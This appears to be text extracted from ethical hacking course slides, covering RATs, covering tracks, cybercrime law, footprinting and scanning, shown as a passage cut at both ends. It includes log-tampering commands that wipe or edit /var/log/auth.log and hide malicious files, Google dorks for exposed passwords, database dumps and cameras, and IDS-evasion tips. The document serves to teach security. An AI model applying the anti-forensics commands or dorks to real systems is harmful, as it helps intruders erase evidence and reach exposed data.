computer\nRATs are usually downloaded invisibly with a user-requested program -- such as a \tgame -- or sent as an email attachment\nThey are difficult to detect if designed to look like normal administrative remote access tools\nThey allow the attacker to connect later at any time\nVictim has a “listener” that opens a port for you to connect to\nOr, the victim can make a reverse connection to you the hacker\nGood for getting past a firewall\nThe hacker must set up a listener\n\nTools- RAT and Backdoor\nVenomRAT\nStitch\nGhost\nSocial_X\nNullRAT\nThe Fat Rat\nRomCom RAT\nRatMilad\nCodeRAT\nImminent Monitor RAT\nKonni RAT\nZuoRAT\nSpyware\nWhat Does It Do?\nTracks online movement and searches for information stored on a computer.\nSlows performance \nCause setting changes\nMalicious software is designed to intercept or partially control a computer’s operation without the user’s consent.\nSteganography\nThe art and science of hiding information by embedding messages within other, seemingly harmless messages\nIt works by replacing bits of useless or unused data in regular computer files with bits of different, invisible information\nData can be anything:\nText\nImage\nMedia file\nEncrypted/not encrypted\nCarrier files appear perfectly normal\nYou can read and play them\nHidden data travels with the file\nRequires knowledge of which file is the host and how to retrieve the hidden data\n\nCovering Tracks\nHiding Activity\nCovering Tracks in Windows\nCovering Tracks in Linux\nHiding Activity\nYour primary task will be to clear/modify/falsify logs\nAlso remove any files/artifacts that could be discovered\nClear registry entries and command line history\nWindows\nEvent Viewer Logs\nSystem\nApplication\nSecurity\nLinux\n/var/log/messages\nYou could also steal a token or impersonate a user Hide your activity by “framing” the other user\nClearing Online/Browser Tracks\nUse private browsing\nDelete browsing history\nDisable stored history\nDelete private data\nClear cookies on exit\nClear data in password manager\nDelete saved sessions\nDelete user JavaScript\nClear cache on exit\nDelete downloads\nDisable password manager\nClear toolbar data\nTurn off AutoComplete\nUse multiple user accounts\nRemove Most Recently Used (MRU)\nTurn off most used apps and recently opened items\nCleaning Event Log in windows\nBest option is be selective and delete the entries pertaining to your actions\nCan also disable auditing ahead of time to prevent logs from being captured\nAnother option is to corrupt a log file to make it unreadable\nThis happens frequently under normal conditions\nStop the event log service or boot another OS\nThen open/edit/save the log file with a text editor\nTools – Event Log Cleaner\nccleaner\nAutomate system cleaning, scrub online history, log files, etc.\nEventlogedit-evtx--Evolution\nRemove individual lines from Windows XML Event Log (EVTX) files\nWorks on Windows 7, Server 2012 and later\nAutomatically clear out Event Viewer logs\nMetasploit clearev\n\nCommon Linux Logs\n/var/log/messages or /var/log/syslog/\nGeneral messages, as well as system-related information\n/var/log/auth.log or /var/log/secure\nStores authentication logs, including both successful and failed logins and authentication methods\n/var/log/boot.log\nRelated to booting and any messages logged during startup\n/var/log/maillog or var/log/mail.log\nStores all logs related to mail servers\n\nCleaning Linux Logs\nIt is possible to echo whitespace to clear the event log file:\necho \" \" > /var/log/auth.log\nAlso you can perform this by using 'black hole dev/null’:\necho /dev/null > auth.log\nTo tamper/modify the log files, you can use sed stream editor to delete, replace and insert data.\nThis command will delete every line that contains the 'opened' word (opened sessions on Linux system):\nsed -i '/opened/d' /var/log/auth.log\nUse hidden files\nname a malicious file “. log” with a space between . and log - then hide in /dev or /tmp\n\nPrivilege Escalation Countermeasures\nRestrict interactive login privileges\nEncrypt sensitive data\nAssign least privilege to users and applications\nVulnerability scan, fuzz, and stress test applications\nPatch and update the kernel, web server, and other services regularly.\nChange UAC settings to “Always Notify”\nEnsure executables are placed in write-protected directories\nDisallow system utilities or software from scheduling tasks\nDisable the default local administrator account.\n\n\n24\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-2-Omani and International Cybercriminal laws.pptx": "Chapter 13\n\n \n Omani & International Cyber Crime Laws\n2/24/2024\nModule 4 - Information Security\n1\n\nThe increasing connectivity of society brought about by the Internet and its numerous advantages have been somewhat offset by the threat posed by individuals who use the Internet and information technology tools to commit cyber crimes against others.... \n2/24/2024\nModule 4 - Information Security\n2\n2/24/2024\nModule 4 - Information Security\n3\n\n2/24/2024\nModule 4 - Information Security\n4\n\n2/24/2024\nModule 4 - Information Security\n5\n\nOmani Cyber Crime Laws: In Oman, the cybercrime laws are mainly governed by the Oman Information Technology Crime Law, which was enacted in 2008. The law criminalizes various activities related to cybercrime, including unauthorized access to computer systems, interception of electronic communications, distribution of viruses or malware, and cyberstalking. The penalties for cybercrime in Oman can range from fines to imprisonment, depending on the severity of the offense.\n2/24/2024\nModule 4 - Information Security\n6\n\nInternational Cyber Crime Laws: The international community has also recognized the importance of cybercrime laws in protecting against various cyber threats. The Council of Europe's Convention on Cybercrime, also known as the Budapest Convention, is a major international treaty that outlines cybercrime laws and regulations. The treaty criminalizes a range of cyber activities, including hacking, computer-related fraud, child pornography, and copyright infringement. The treaty has been ratified by numerous countries, including the United States, Japan, and many European nations.\nIn addition to the Budapest Convention, other international organizations, such as the United Nations, have also developed guidelines and recommendations for combating cybercrime. The UN's Office on Drugs and Crime (UNODC) has published a model law on cybercrime that provides a framework for countries to develop their own cybercrime legislation.\nOverall, both Oman and the international community have recognized the importance of cybercrime laws in protecting against various cyber threats and criminal activities. The laws and regulations related to cybercrime are continually evolving and adapting to the changing landscape of technology and the internet.\n\n2/24/2024\nModule 4 - Information Security\n7\n2/24/2024\nModule 4 - Information Security\n8\nOman Data Protection Legislation\n2/24/2024\nModule 4 - Information Security\n9\nInternational law and freedom of expression online\nThe right to freedom of expression is a fundamental human right enshrined in all major international and regional human rights law instruments, such as the Universal Declaration of Human Rights (UDHR), the International Covenant on Civil and Political Rights (ICCPR), the European Convention on Human Rights (ECHR), the Arab Charter on Human Rights (Arab Charter), the American Convention on Human Rights (ACHR), and the African Charter on Human and Peoples’ Rights (ACHPR).\n2/24/2024\nModule 4 - Information Security\n10\n2/24/2024\nModule 4 - Information Security\n11\n\nFor more information on International Cyber laws please refer below website\nA Brief Primer on International Law and Cyberspace - Carnegie Endowment for International Peace\n2/24/2024\nModule 4 - Information Security\n12\nReferences\nRead more on: https://www.omanobserver.om/article/70974/Opinion/an-overview-of-the-sultanates-cyber-crimes-law\n\n2/24/2024\nModule 4 - Information Security\n13\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-3FootPrinting.pptx": "Chapter-3\u000b\u000bFootprinting and Reconnaissance \nTopics\n•\tFootprinting Concepts\n•\tFootprinting through Search Engines, Web Services, Social Networking Sites\n \tSocial Engineering- Computer Based and Human Based\n•\tWebsite Footprinting\n•\tEmail Footprinting\n•\tWhois Footprinting\n•\tDNS Footprinting\n•\tNetwork Footprinting\n•\tFootprinting Tools\n•\tFootprinting countermeasures\n\nFootprinting\nFootprinting, refers to the systematic process of gathering information about a target network, system, organization, or individual with the intent of identifying potential vulnerabilities and weaknesses. \nThis information is often collected through various passive and active reconnaissance techniques, without actually exploiting any vulnerabilities. \nFootprinting is a crucial initial phase in the hacking process, providing hackers with a detailed understanding of their target and serving as a foundation for planning and launching cyberattacks.\nActive Footprinting:\n\nDefinition:\nActive footprinting involves direct interaction with the target to gather information, such as probing open ports, performing vulnerability scans, or engaging with services.\nCharacteristics:\nIt's more intrusive as it actively sends requests or probes to the target.\nTypically involves scanning, probing, or querying target systems.\nMay generate network traffic and logs on the target, potentially raising alerts.\nOutput:\nProvides specific and real-time information about the target's current state.\nReveals open ports, services, and potential vulnerabilities.\nMay trigger responses that can aid in OS or service identification.\nTools and Techniques:\nPort scanning, banner grabbing, vulnerability scanning, ICMP probing, DNS zone transfers, SMTP enumeration, SNMP enumeration, SMB enumeration, and more.\nPurpose:\nActive footprinting is used to identify immediate weaknesses and vulnerabilities in the target.\nHelps in the preparation of specific attacks by revealing potential entry points and misconfigurations.\n\nPassive Footprinting:\n\nDefinition:\nPassive footprinting involves the collection of information without directly interacting with the target. It relies on publicly available data and observed behaviors.\nCharacteristics:\nNon-intrusive and stealthy; doesn't involve direct communication with the target.\nGathers information from publicly accessible sources, such as websites, social media, news articles, and public records.\nOutput:\nProvides historical and pre-existing information about the target.\nGathers data such as domain names, IP addresses, contact details, employee names, and affiliations.\nOften used for reconnaissance before active footprinting.\nTools and Techniques:\nSearch engines, social media monitoring, web scraping, DNS queries, online databases, and open-source intelligence (OSINT) tools.\nPurpose:\nPassive footprinting establishes a baseline understanding of the target's digital presence and public information.\nAids in identifying potential attack vectors, targets, and areas for further investigation during active footprinting.\n\n\nActive Footprinting concepts \nPort Scanning:\nDefinition: Port scanning involves scanning a target system's network ports to determine which ports are open and potentially vulnerable to attack.\nExpected Output: A list of open ports and their associated services.\nTools: Nmap, Masscan, Zenmap.\n\nBanner Grabbing(Web Application\\Database):\nDefinition: Banner grabbing is the process of connecting to open ports and capturing banners or service information that reveals software versions and configurations.\nExpected Output: Information about the services running on open ports, including version numbers.\nTools: Telnet, Netcat, Nmap.\n\nOS Fingerprinting:\nDefinition: OS fingerprinting is the attempt to identify the operating system running on a target host by analyzing its responses to network probes.\nExpected Output: Information about the target's operating system.\nTools: Nmap, P0f, Xprobe2.\n\nVulnerability Scanning:\nDefinition: Vulnerability scanning involves using specialized tools to scan for known vulnerabilities in the target's software, services, and configurations.\nExpected Output: A report listing identified vulnerabilities and their severity.\nTools: Nessus, OpenVAS, Qualys.\n\nPing Sweeping:\nDefinition: Ping sweeping is the process of sending ICMP (Internet Control Message Protocol) echo requests to a range of IP addresses to determine which hosts are online.\nExpected Output: A list of live hosts within the specified IP range.\nTools: Ping, fping, Nmap.\n\nTraceroute:\nDefinition: Traceroute traces the path that network packets take from the source to the target, revealing the intermediate routers and network devices.\nExpected Output: A list of routers and their IP addresses along the network path.\nTools: Traceroute, MTR (My Traceroute), PathPing.\n\nDNS Enumeration:\nDefinition: DNS enumeration involves querying DNS servers to gather information about a target's domain names, subdomains, and DNS records.\nExpected Output: A list of domain names, subdomains, and associated IP addresses.\nTools: nslookup, dig, dnsrecon.\n\nPassive Footprinting concepts \n \nGoogle Hacking:\nDefinition: Using advanced search queries in search engines like Google to discover sensitive or hidden information.\nExpected Output: Information about vulnerable systems, login pages, exposed directories, and more.\nTools/Websites: Google Dorks, Google Hacking Database (GHDB).\n\nEmail Harvesting:\nDefinition: Collecting email addresses associated with the target.\nExpected Output: Lists of email addresses related to the organization or individuals.\nTools/Websites: TheHarvester, Hunter.io, Email finding extensions.\n\nWHOIS Lookup:\nDefinition: Retrieving domain registration information.\nExpected Output: Domain owner's name, contact information, registration date, and more.\nTools/Websites: WHOIS lookup tools, registrar websites.\nMetadata Analysis:\nDefinition: Extracting metadata from files (e.g., documents, images) to reveal hidden information.\nExpected Output: Author names, software used, document history, geolocation data.\nTools/Websites: ExifTool, online metadata analyzers.\nRobot.txt Analysis:\nDefinition: Checking the robots.txt file on websites for information about restricted or allowed content.\nExpected Output: URLs disallowed for web crawlers, revealing potentially sensitive areas.\nTools/Websites: Manually inspecting robots.txt, web crawler tools.\n\nArchive Sites:\nDefinition: Searching archived versions of websites to access historical data.\nExpected Output: Historical content, design changes, and previous site configurations.\nTools/Websites: Archive.org, archive.is, web archive search engines.\n\n Search Engine Cache:\nDefinition: Accessing cached versions of web pages to retrieve historical data.\nExpected Output: Previous versions of web pages, content changes over time.\nTools/Websites: Google Cache, Wayback Machine.\n\nSocial Media Profiling:\nDefinition: Analyzing an organization's or individual's presence on social media platforms.\nExpected Output: Information about employees, organizational structure, interests, and connections.\nTools/Websites: Social media platforms (LinkedIn, Facebook, Twitter), OSINT tools.\n\nPhone Number Search:\nSample Query: phonebook: \"John Doe\" site:example.com\nInformation Collected: Phonebook listings for \"John Doe\" on the website example.com.\nLocation Search:\nSample Query: location: \"New York\" site:example.com\nInformation Collected: Pages on the website example.com related to \"New York.\"\nFiletype and Keyword Search:\nSample Query: filetype:docx password site:example.com\nInformation Collected: Word documents containing the word \"password\" on the website example.com.\nSite-Specific Search:\nSample Query: site:example.com \"confidential\" \"for internal use\"\nInformation Collected: Pages on example.com containing the phrases \"confidential\" and \"for internal use.\"\nLogin Page Search:\nSample Query: inurl:login site:example.com -intext:password\nInformation Collected: Login pages on example.com without the word \"password\" in the page content.\nFiletype and Specific Document Search:\nSample Query: filetype:xls site:example.com \"sales report\"\nInformation Collected: Excel spreadsheets related to \"sales report\" on the website example.com.\nUsernames Search:\nSample Query: inurl:users site:example.com\nInformation Collected: URLs related to \"users\" on the website example.com, potentially indicating user profiles.\nError Message Search:\nSample Query: site:example.com \"error: 404\"\nInformation Collected: Pages on example.com containing \"error: 404\" messages.\nFiletype Search:\nSample Query: filetype:pdf site:example.com confidential\nInformation Collected: PDF files containing the word \"confidential\" on the website example.com.\nInurl Search:\nSample Query: inurl:admin site:example.com\nInformation Collected: URLs containing \"admin\" on the website example.com, potentially revealing administrative pages.\nIntitle Search:\nSample Query: intitle:\"login page\" site:example.com\nInformation Collected: Pages with \"login page\" in the title on the website example.com, suggesting login portals.\nLink Search:\nSample Query: link:example.com\nInformation Collected: Websites linking to example.com, which may reveal partnerships or associations.\nCache Search:\nSample Query: cache:example.com\nInformation Collected: Cached versions of the website example.com, showing historical content.\nRelated Search:\nSample Query: related:example.com\nInformation Collected: Websites related to example.com, potentially revealing competitors or affiliates.\nInfo Search:\nSample Query: info:example.com\nInformation Collected: Information about the website example.com, including links, cached pages, and similar sites.\n\nFootprinting through search engines- Advanced Google Hacking\nGoogle Hacking, also known as Google Dorking, involves using advanced search queries to find specific information on the internet, including potentially sensitive or hidden data. \nHere are some advanced Google Hacking options, along with sample queries and the types of information that can be collected:\nFootprinting through search engines- Google Hacking\nThe use of specialized Google searches\nFind unusual information such as:\nSites that may link back to target’s website\nInformation about partners, vendors, suppliers, clients, etc.\nError messages that contain sensitive information\nFiles that contain passwords\nSensitive directories\nPages that contain hidden login portals\nAdvisories and server vulnerabilities\nSoftware version information\nWeb app source code\nUsing search strings with advanced operators\nFind information not readily available on a website\nCan be used to find vulnerabilities, files containing passwords,  lists of emails, log files, live camera feeds, and much more\nConsidered an easy way of hacking\nCamera feeds – live feeds from AXIS cameras\nintitle:\"Live View / - AXIS\" | inurl:/mjpg/video.mjpg?timestamp\nEmail lists contained in Excel files\nfiletype:xls inurl:\"email.xls\"\nLog files containing passwords and corresponding emails\nfiletype:log intext:password intext:(@gmail.com | @yahoo.com |  @hotmail.com)\nOpen FTP Servers that can contain sensitive information\nintext:\"index of\" inurl:ftp\nReturn results that match “accounting” from target.com, but NOT from  marketing.target.com\nsite:target.com -site:marketing.target.com accounting\nPages vulnerable to SQL injection attacks\ninurl:\".php?id=\" intext:(error AND sql)\nScanning reports – vulnerabilities in scanned systems\nintitle:report (nessus | qualys) filetype:pdf\nSQL Database – contents of exposed databases, including usernames  and passwords\nintitle:\"index of\" \"dump.sql\"\n\nList of popular Google Dorks\n\nhttps://www.exploit-db.com/google-hacking-database/\nFootprinting Through Social Networking Sites\nAttackers use social networking sites to gain important and sensitive data about  their target\nThey often create fake profiles through these social media\nAim is to lure their target and extract vulnerable information\nEmployees may post :\nPersonal information such as DOB, educational and employment background, spouse’s  names, etc.\nInformation about their company such as potential clients and business partners, trade  secrets of business, websites, company’s upcoming news, mergers, acquisitions, etc.\nCommon social networking sites used:\nFacebook, MySpace, LinkedIn, Twitter, Pinterest, Google+,YouTube, Instagram\nPresent activity/physical location\nJob activities\nCompany information\nContact details, names, numbers, addresses, date of birth, photos\nFamily & friends\nProperty information\nBank details\nBackground and criminal checks\nA great source of personal and organizational information\nResidential addresses, email addresses, phone number\nSatellite photos of residences\nDate of birth\nPhotos and social networking profiles\nFriends/family/associates\nHobbies/current activities/blogs\nWork information\nProjects and operating environment\nTravel details\nPeople Search Sites\nCheckPeople\nBeenVerified\nTruthfinder\npeopleWhiz\nPeopleLooker\nIntelius\nCheckmate\nPeoplefinders\nIDtrue\nSocial Engineering- Computer Based and Human Based\nHuman-Based Social Engineering: In human-based social engineering, the primary manipulator is a real person who interacts directly with the target. This can involve in-person communication, phone calls, or other forms of direct human interaction.\nThis approach typically relies on social skills, persuasion, and the ability to build rapport with the target. Manipulators may use techniques like pretexting (creating a fabricated scenario), impersonation, or tailgating (following an authorized person into a secure area) to achieve their goals.\nThis approach is often more resource-intensive and may target a smaller number of individuals due to the need for direct interaction.\n\nComputer-Based Social Engineering: Computer-based social engineering relies on automated or scripted methods, often using digital communication channels like email, messaging apps, or social media. There is no direct human interaction involved; instead, the manipulation is carried out through written or automated messages. \nThis approach relies on written communication and the use of psychological tactics to trick the target. Common methods include phishing (sending deceptive emails to trick recipients into taking action), baiting (enticing targets to download malicious files), and pretexting through digital channels.\nIt can be automated to reach a larger audience, making it possible to target a larger number of potential victims simultaneously.\nCollect names, job titles, personal information, contact information, email  addresses, etc.\nRemember: at this stage you want to be subtle and go unnoticed\nTechniques include:\nCasual face-to-face contact\nTrade show or public event\nEavesdropping\nShoulder surfing\nDumpster diving\nImpersonation on social networking sites\nWebsite Footprinting\nWebsite Footprinting, also known as web reconnaissance or information gathering, is the process of collecting information about a website, its infrastructure, and the associated web resources. \nMonitoring and analyzing the target’s website for information\nBrowse the target website\nUse Burp Suite, Zaproxy, Paros Proxy, Website Informer, Firebug, etc. to determine:\nConnection status and content-type\nAccept-Ranges and Last-Modified information\nX-Powered-By information\nWeb server version\nExamine HTML sources\nExamining cookies\nUse OSINT to discover additional information about a website\nIdentify personnel, hostnames, domain names, and useful data residing on exposed  web servers\nSearch Google, Netcraft, Shodan, LinkedIn, PGP key servers, and other sites\nSearch known domain names and IP blocks\n\nSearches Google’s cache\nLooks for vulnerabilities, errors, configuration issues, proprietary information, and  interesting security nuggets on web sites\nUse it to find information that can be exposed through Google Dorking\nWeb content scanner\nLooks for existing and hidden  web objects\nUseful for finding hidden  subdirectories in a web app\nWorks by launching a dictionary  based attack against a web  server\nAnalyzes the response\nWebsite Ripper Copier\n Offline Explorer Enterprise\nArchive.org\nWebWatcher\nAllows access to archived versions of the website\nCopies the site as it was at the time\nYou can find information that was subsequently deleted\nArchived sites may or may not include original downloads\nAlso contains extensive content uploaded by the community\nDownload an entire copy of the website to a local directory\nYou can examine the entire website offline\nHelps gather information without making website requests that could be detected\nYou can take your time searching\nNeed to copy slowly\nTOOLS\nHTTrack Web Site Copier\nSurfOffline\nTeleport Pro\nPortable Offline Browser\n\nEmail Footprinting\nEmail Source Header\nReading the email source header can reveal:\nAddress from which the message was sent\nSender’s mail server\nAuthentication system used by sender’s mail server\nDate and time of message\nSender’s name\nAlso reveals:\nSpoofed info\nBogus links and phishing techniques\nTracking Email can reveal\nRecipient IP address\nGeolocation\nEmail received and read\nRead duration\nProxy detection\nLinks\nOS and Browser info\nForwarded email\nRecipient device type\nTools\nEmailTrackerPro \nPoliteMail\nYesware\nContactMonkey\n\nZendio\nReadNotify\nDidTheyReadit\n\n\n\nA widely-used query and response protocol\nUsed to query databases that store the registered users or assignees of an Internet  resource such as:\nDomain names\nIP address blocks\nAutonomous system numbers\nThe protocol stores and delivers database content in a human-readable format\nIt is widely available for publicly available for use\nSource: domainnamestat.com\nWHOIS databases are maintained by Regional Internet Registries and hold personal  information of domain owners\nWHOIS query\nDomain name and details\nOwner information\nDNS servers\nNetwork Blocks\nAutonomous System Numbers\nWhen created\nExpiry\nLast update\nCan aid attacker or ethical hacker with social engineering\nPopular WHOIS Lookup Tools\nwhois.com\nDomainnamestat.com\nLanWhoIs\nBatch IP Converter\nCallerIP\nWhoIs Lookup Multiple Addresses\nWhoIs Analyzer Pro\nHotWhoIs\nActiveWhoIs\nWhoisThisDomain\nAttackers use DNS data to find key hosts on the target’s network\nDNS record types:\nA – IPv4 host address\nAAAA - IPv6 host address\nMX – mail server\nNS – name server\nCNAME – alias\nSOA – authority for domain\nSRV – service records\nPTR – maps IP Address to hostname\nRP – responsible person\nHINFO – Host information record (CPU type/OS)\nTXT – Unstructured text record\nDNS Footprinting\nDNS Query Tools\nNslookup\ndig\nhost\nwhatsmydns.net\nmyDNSTools\nProfessional Toolset\nnslookup www.hackthissite.org\nServer:  Address:\n192.168.63.2\n192.168.63.253\nNon-authoritative answer:\n Name:\twww.hackthissite.org  Address: 137.74.187.103\nName:\twww.hackthissite.org  Address: 137.74.187.102\ndig www.example.com\ndig @8.8.8.8 www.example.com A  dig +short www.example.com A  dig example.com txt\ndig example.com cname  dig example.com ns  dig example.com MX\ndig axfr zonetransfer.me @nsztm1.digi.ninja.\nNetwork Footprinting\n$ host -t a github.io\ngithub.io has address 185.199.109.153\n\n$ whois 185.199.109.153\ninetnum:  netname:  country:\n185.199.108.0 - 185.199.111.255\nUS-GITHUB-20170413  US\n$ curl -s https://networksdb.io/ip-addresses-of/github-inc | grep 'IP  Range' | awk '{print $3\" - \"$5}' | sort\n140.82.112.0 - 140.82.127.255\n148.62.46.150 - 148.62.46.151\nDiscover routers and firewalls along the path to a target\nUses ICMP or UDP with an increasing TTL to elicit router identification\nFind the IP address of the target firewall\nHelp map the target network\nhttps://www.monitis.com/traceroute/\nhttps://centralops.net/co/\nRecognize that once information is on the Internet, it might never fully disappear\nPerform OSINT on yourself regularly to see what’s out there\nIdentify information that might be harmful\nWhen possible, go to the sites that publish that information and remove it\nDelete/deactivate unnecessary social media profiles\nUse an identity protection service\nUse Shodan and Google Dorks to search for exposed files and devices\nIf any are discovered, implement protective measures\nFootprinting Countermeasures\nSet up a monitoring service such as Google Alerts to notify you if new information  appears\nTrain yourself (and your employees) to recognize the danger and be cautious  about what they share on social media\nIf possible, use a data protection solution to minimize data leakage from the  company\nTurn off tracking features on your phone and configure privacy settings\nDisable location on photos you plan to post publicly on social media\nRemove metadata from images if you don’t want others to know which device you  are using to capture\nFootprinting Countermeasures(cont’d)\n\n37\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-4Scanning.pptx": "Chapter -4 \u000bScanning\nTopics Covered\nScanning Networks\nNetwork Scanning Concepts\nScanning Tools\nHost Discovery\nPort and Service Discovery\nOS Discovery (Banner Grabbing / OS Fingerprinting)\nScanning beyond IDS/Firewall\nScanning Networks\nSearch the network for potential targets to \nDiscover live hosts\nDiscover services and listening ports\nFingerprint OSes and services\nIdentify targets for a vulnerability scan\n\nFingerprinting: identifying an OS or service version through actively engaging the target\nThe goal of scanning is to ultimately find vulnerable targets that you can exploit!\n\nCan be:\nActive (engage the target for information)\nPassive (sniff traffic for information)\nAnd……\nDiscovery Scan\nFind potential targets\nPort Scan\nSee what services hosts are running\nVulnerability Scan\nSee if those services are vulnerable to hacking\nOther Scans\nMap hostnames - IP addresses - MAC addresses\nIdentify additional supported protocols\nStealthy alternatives to port scans\nNetwork Scanning Tasks\nIPv6 addresses are 128 bits\nTraditional scanning techniques are not feasible because of the larger search  space (64 bits)\nSome scanning tools do not support scanning IPv6 networks\nAttackers may gather IPv6 addresses from:\nnetwork traffic\nrecorded logs\nheader lines in archived emails\nUsenet news messages\nIf an attacker does discover and compromise one host:\nThey can probe the “all hosts” link local multicast address FF01::1\nDiscover additional targets on the link\nYou take a typical IP/ICMP/TCP/UDP packet and:\nSpecify what settings or values should be in the header fields or payload\nSend the packet to the target\nSee how the target responds to “illegal” or unexpected packet settings\nDifferent OSes respond in different ways\nYou can often identify the OS based on the response:\nIP - TTL, Don’t Fragment (DF) flag / Don’t Fragment ICMP (DFI)\nTCP - Starting window size, Explicit congestion notification (ECN) flag\nSequence number generation\nICMP - echo request / echo reply padding\nTools\n-Nmap  -Hping3  -Colasoft   -NetScan Tools Pro     -Cat Karat\n\nAdvanced Scanning using crafted Packets\nICMP Discovery Scans\nICMP - Internet Control Messaging Protocol(Used in PING Command)\nLayer 3 protocol\nDirect payload of IP\nProtocol ID 1\nHas message types\nEach message type in turn may have codes for further information\nWhat is a Discovery Scan?\nA type of scan that discovers live IP addresses on a network\nA Ping Sweep is the simplest network scanning method\nIt uses ICMP ECHO REQUEST packets to search for live hosts\nFew discovery scans use ARP instead of ICMP to  bypass host-based firewalls\nCan also use specially crafted TCP or UDP packets\nThe easiest protocol to use to scan for live systems\nScanner sends ICMP ECHO requests to one or more IP addresses\nIf live, hosts will return an ICMP ECHO REPLY\nUseful for locating local devices\nOften blocked by:\nSoftware firewall on the host\nPacket filtering router/firewall between the scanner and target network\nUseful for determining if a firewall is permitting ICMP\nExample:\nICMP Echo returns Type 3 Code of 13 “Destination unreachable administratively prohibited”\nThis type of message is typically returned from a device blocking a port\nIndicates a firewall that was poorly configured - the firewall should send no response at all\nUse ARP requests/replies to discover live hosts\nCannot be blocked by a personal firewall\nARP is required to discover MAC addresses and map them to IP addresses\nUsed on an Ethernet or Wi-Fi LAN\nTools include:\nNmap\nEttercap\nMetasploit\nCain & Abel\nPORT Scans\nWhat is a PORT\nA number (0 - 65535) that represents a process on a network\nWell-known services use specific port numbers by convention\n\nBoth TCP and UDP use port numbers\nSource and destination each have a port\nEmbedded in the header\nIndicates the payload\nA client and server will each have its own port in a conversation\nUsually not the same port\nSome services are only “loosely bound” to a port\nIt is possible for another process to “get in front of” that service\nTake over the port\nThis happens in hacking\nExample: netcat getting in front of IIS\nIntercepts and redirects web traffic\nWell-known ports(ports - 0 – 1023,      NOTE:- 0 is not used)\nReserved by convention for well-known services\nServer listens on well-known port for incoming connection attempts\nClient process, identified by its own port, attempts to make a connection\nThe server can accept or reject the connection attempt\nUsually based on if there is a listening service on that port\nCan also have firewall filtering or other policies that block connections from specific clients\nRegistered(ports - 1024 – 49151)\nServices can additionally request the use of these ports from the operating system\nDynamic(ports - 49152 – 65535)\nOperating system temporarily assigns a dynamic port to a client process\nThe port is “returned” to the OS when the client process ends\nCommon Port Numbers and Services\nScanning for Open Ports\nLook for open TCP or UDP ports\nAn open port indicates a listening service\nMight have exploitable vulnerabilities\nTCP and UDP respond differently to scans\nWhat is a TCP PORT SCAN\nThe most common type of port scan\nAttacker sends TCP packets to the target\nVarious TCP header flags are raised (bit set to 1)\nResponse can indicate:\nListening service\nOS version\nFirewall settings etc.\nTCP \nHEADER\n\nSYN -\tSYN-ACK - ACK\nEstablish session\nSet starting sequence numbers\nTCP 3-Way Handshake\nFIN-ACK -\tFIN-ACK\nProperly end a session\nBoth sides FIN and ACK the other\nTCP 4-Way Goodbye Handshake\nMost common type of port scan\naka Stealth Scan or Half-Open Scan\nClient sends SYN packet to server\nServer responds with SYN/ACK packet\nServer responds with RST packet and remote port is closed\nClient sends RST packet to close the initiation before connection is established\nResets TCP connection between client and server in midstream\nConnection is only “half open”\nAKA TCP Full Scan, or TCP Open Scan\nCompletes the TCP three-way handshake\nEstablishes a full connection\nThen tears it down by sending a RST packet\nDoes not require super user privileges on Linux\nAppears “normal” to intrusion detection\nLeast likely to rouse suspicion\nUsed to determine if the host is protected by filtering/firewall\nSince (nearly) every TCP segment contains a raised ACK flag, an ACK scan appears normal\nCan evade IDS in most cases\nCan be used against packet filtering routers to see what’s behind it\nAttacker sends ACK probe packet with a random sequence number to target\nNo response = protected (filtered) by firewall\nRST = port is closed\nTTL-based\nSend 1000s of ACKs to different TCP ports\nAnalyze TTL field in RST packets received\nIf boundary value < 64, then port is open, If greater than 64, then port is closed\nWindow-based\nSend 1000s of ACKS to different TCP ports\nIf WINDOW value of RST received has non-zero value, then port is open\nStealthier than a SYN scan\nDoes not attempt to start a TCP connection\nUsed to discover firewall rules / evade detection by IDS\nTCP flags are raised in an unusual / illegal pattern\nTypes include:\nXMAS Scan (PSH, URG, FIN)\nNull Scan\nFIN Scan\nNo handshake involved\nUDP is a stateless protocol\nYou can send a UDP datagram\nYou often won’t get a response\nUDP itself cannot determine if host is alive, dead or filtered\nSometimes a UDP closed port will return an ICMP port unreachable message\nAKA “blind” scan or “idle” scan\nMap open ports on a remote system without producing any evidence that you have  interacted with that system\nForce target to interact with a third machine (zombie)\nCheck Zombie’s IPID to see if it incremented\nIP identification (IPID) identifies a packet in a communication session\nIts primary purpose is to recover from IP fragmentation\n\nAKA OS fingerprinting\nA way to determine the operating system running on the remote target system\nSome services identify themselves when queried\nError messages can reveal information about the service or OS\nYou can use banner grabbing to identify the service and/or OS version\nCan also examine TCP and ICMP messages to identify OS\nIn TCP Layer\nWindow Size\n0x7D78 (32120) = Linux\nCisco & Microsoft constantly change\nIn IP Layer:\nTTL\n64 = Linux / FreeBSD\nDon’t Fragment (DF) bit\nSee if the DF (Don’t Fragment) bit is set(=1)\nSCO & OpenBSD do not use the DF flag\nType of Service (ToS)\nIndicates the protocol (priority) more than the OS\ntelnet <target IP> <port number>\n\nnc –vv <target IP> <port number>\n\necho -en \"GET / HTTP/1.0\\n\\n\\n\"|nc www.comptia.org 80|grep Server\nA highly flexible open source tool for scanning networks\nCommand-line based for Linux and Windows\nTool-1 Network Mapper(NMAP)\nZENMAP\nGUI version of NMAP\nUses NMAP syntax\nCreated for Windows users\nCommand line network scanning\nPacket crafting\nCan perform various scan types\nUsed for:\nHost discovery\nNetwork security auditing\nFirewall testing\nManual path MTU discovery\nAdvanced traceroute\nRemote OS fingerprinting\nRemote uptime estimating\nTCP/IP stack auditing\nTool-2 HPING2/HPING3\nRaise TCP FIN Flag\nPacket Count\nDestination Port\nSource Port\nTarget responds with TCP RST and ACK\nEach firewall configuration presents its own challenges to scanning\nIf you are scanning a network “black box” style you do not know which, if any,  firewall type you will encounter\nIf you can infer which type you’re encountering, this will give you an advantage in a  pentest\nYou’ll have a better idea of:\nWhich techniques to not spend too much time on\nOther approaches you should consider to break into the network\nTry to determine:\n\nThe firewall rule set (allowed and blocked ports)\nFirewall type (stateful or stateless)\nWeaknesses in the firewall’s configuration\nDevices behind the firewall\nThe attacker splits the probe packets into several smaller fragments\nThen sends them to the target network\nThe packet is then reassembled at the final destination\nThe IDS/Firewall processes each packet separately\nDoesn’t recognize that the packet is malicious\nThe payload fragments are each too short to match a known signature\nIDSes are often configured to skip fragmented packets during 